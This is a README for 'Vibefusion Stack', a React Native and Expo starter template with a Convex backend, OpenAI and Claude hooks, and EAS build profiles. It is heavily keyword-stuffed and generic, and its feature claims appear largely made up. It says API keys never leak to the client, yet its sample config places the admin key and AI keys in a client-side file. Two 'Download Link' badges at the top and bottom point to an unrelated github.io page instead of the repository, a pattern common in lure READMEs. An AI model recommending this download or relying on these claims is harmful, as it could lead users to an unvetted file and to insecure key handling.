# Vibefusion Stack: Cross-Platform App Accelerator with Convex Backend and EAS Deployment

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://beoutq586.github.io/flow-forge/)

## Overview

Vibefusion Stack is not just another React Native starter template; it is a **productivity engine** designed to eliminate the friction between idea and app store. Inspired by the minimalist philosophy of "vibe coding," this repository provides a complete, production-ready foundation for building cross-platform mobile applications with a **Convex backend** and **Expo Application Services (EAS)** deployment pipeline. Whether you are a solo founder prototyping a new concept or a team shipping a MVP, this stack handles the scaffolding so you can focus on what matters: the user experience.

## Key Features

- **Zero-Config Convex Integration** – Real-time data sync, serverless functions, and schema management out of the box.
- **EAS Build & Submit Ready** – Pre-configured Expo profiles for iOS and Android deployment.
- **Responsive UI Primitives** – Adaptive components that scale from phone to tablet without extra effort.
- **Multilingual Support** – Built-in i18n framework supporting 10+ languages.
- **24/7 Customer Support Module** – Integrated chat and ticketing system using Convex mutations.
- **OpenAI & Claude API Integration** – Pre-built hooks for AI-powered features (chat, summarization, recommendations).
- **SEO-Friendly Metadata** – Dynamic head management for web-based previews.
- **Offline-First Architecture** – Local state persistence with automatic conflict resolution via Convex.

## Architecture Diagram

```mermaid
graph TD
    A[User Device] --> B[React Native App]
    B --> C[Expo Router]
    C --> D[Convex Client SDK]
    D --> E[Convex Backend Cloud]
    E --> F[OpenAI API]
    E --> G[Claude API]
    D --> H[Local SQLite Cache]
    B --> I[EAS Build Service]
    I --> J[App Store Connect / Google Play Console]
    B --> K[Responsive UI Engine]
    K --> L[Multi-Platform Rendering]
    L --> M[iOS]
    L --> N[Android]
    L --> O[Web (React Native Web)]
```

## Example Profile Configuration

To customize Vibefusion Stack for your project, create a `config/profile.json` file in the root directory:

```json
{
  "appName": "Vibefusion",
  "slug": "vibefusion-app",
  "version": "1.0.0",
  "convex": {
    "deploymentUrl": "https://your-project.convex.cloud",
    "adminKey": "your-admin-key"
  },
  "eas": {
    "projectId": "your-expo-project-id",
    "android": {
      "package": "com.vibefusion.app",
      "adaptiveIcon": {
        "foregroundImage": "./assets/adaptive-icon.png",
        "backgroundColor": "#1a1a2e"
      }
    },
    "ios": {
      "bundleIdentifier": "com.vibefusion.app",
      "supportsTablet": true
    }
  },
  "ai": {
    "openai": {
      "apiKey": "sk-...",
      "model": "gpt-4-turbo"
    },
    "claude": {
      "apiKey": "sk-ant-...",
      "model": "claude-3-opus-20240229"
    }
  },
  "i18n": {
    "defaultLocale": "en",
    "supportedLocales": ["en", "es", "fr", "de", "ja", "ko", "pt", "ru", "zh", "ar"]
  }
}
```

## Example Console Invocation

Start the development server with a single command:

```bash
npx create-vibefusion-app my-app --template minimal
cd my-app
npm run convex:dev
```

This launches the Expo development client, connects to your Convex backend, and opens the Metro bundler. For production builds:

```bash
npm run eas:build:ios
npm run eas:submit:android
```

## Emoji OS Compatibility Table

| Platform     | Status            | Minimum Version | Emoji Support |
|--------------|-------------------|-----------------|---------------|
| iOS          | Fully Supported   | 15.0+           | ✅            |
| Android      | Fully Supported   | API 26+         | ✅            |
| Web (PWA)    | Supported         | Chrome 90+      | ✅            |
| Windows      | Experimental      | 10+ (UWP)       | ⚠️ Partial    |
| macOS        | Supported         | 12+             | ✅            |

## Feature List

1. **Instant Backend Setup** - Deploy a Convex project in under 60 seconds using the integrated CLI wrapper.
2. **EAS Build Profiles** - Pre-configured `eas.json` with development, preview, and production stages.
3. **Real-Time Collaboration** - Concurrent editing with WebSocket-backed state synchronization.
4. **AI Chat Module** - Drop-in component using OpenAI or Claude for intelligent conversations.
5. **Push Notifications** - Expo Notifications integration with Convex triggers.
6. **In-App Purchases** - RevenueCat setup for subscription and consumable products.
7. **Analytics Dashboard** - Plausible or PostHog integration for privacy-first metrics.
8. **Offline Queue** - Pending mutations stored locally and replayed on connectivity restoration.
9. **Theme System** - Light/dark mode with CSS variable compatibility for web targets.
10. **Automated Testing** - Jest and Detox configurations included.

## SEO-Friendly Keyword Integration

Vibefusion Stack is engineered for discoverability: from **React Native starter template** to **cross-platform app development** and **Convex backend deployment**, every component is labeled with semantic metadata. The built-in i18n system also injects localized keywords for **mobile app SEO** across 10 languages. Ideal for developers searching for **Expo EAS deployment guide**, **serverless mobile backend**, or **AI-powered app template**.

## OpenAI API and Claude API Integration

The stack includes two pre-built hooks:

```javascript
// hooks/useOpenAI.js
import { useMutation } from 'convex/react';
import { api } from '../convex/_generated/api';

export function useOpenAI() {
  const generate = useMutation(api.ai.openai.generate);
  return { generate };
}
```

```javascript
// hooks/useClaude.js
import { useMutation } from 'convex/react';
import { api } from '../convex/_generated/api';

export function useClaude() {
  const summarize = useMutation(api.ai.claude.summarize);
  return { summarize };
}
```

Both APIs are secured via Convex server-side functions, ensuring API keys never leak to the client.

## Responsive UI and Multilingual Support

The responsive UI engine uses a **grid-based layout** that adapts to any screen width. Combined with the i18n provider, the interface re-renders text and directional flow (RTL for Arabic, for example) without layout breakage. The multilingual module supports dynamic language switching without a page reload, leveraging React context for instantaneous updates.

## 24/7 Customer Support

A built-in support module uses Convex mutations to create tickets and OpenAI to auto-suggest answers. When a user submits a query, the system attempts an AI-generated response first; if unresolved, it escalates to a human through **Twilio or SendGrid integration** (configurable). The entire flow is visible in a real-time dashboard.

## 2026 Outlook

By 2026, Vibefusion Stack will incorporate **edge-deployed Convex functions** for sub-100ms latency globally, **AI-assisted code generation** for new components, and **quantum-resistant encryption** for data at rest. The roadmap includes native support for **visionOS and Wear OS** platforms.

## Disclaimer

This software is provided "as is" without warranty of any kind, either expressed or implied. The authors are not responsible for any damages or data loss arising from the use of this template. Always test thoroughly before deploying to production. AI-generated content should be reviewed for compliance with local regulations.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://beoutq586.github.io/flow-forge/)

---

*Vibefusion Stack – Build without boundaries.*